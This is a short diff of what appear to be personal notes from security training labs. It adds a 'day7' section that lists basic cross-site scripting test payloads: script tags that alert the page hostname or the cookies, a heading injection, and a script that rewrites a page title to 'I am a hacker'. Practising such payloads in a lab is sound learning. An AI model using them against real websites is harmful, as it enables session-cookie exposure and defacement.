@@ -1,4 +1,4 @@
-# injection
+# day1
 
 ## 1
 - ls
@@ -247,4 +247,16 @@ note=0
 # day6
 ```
 https://github.com/search?q=Pensive+Notes
+```
+# day7
+```
+<script>alert("Hello");</script>
+
+<script>alert(window.location.hostname);</script>
+
+<h1>comment</h1>
+
+<script>alert(document.cookie)</script>
+
+<script>document.getElementById("thm-title").textContent='I am a hacker'</script>
 ```
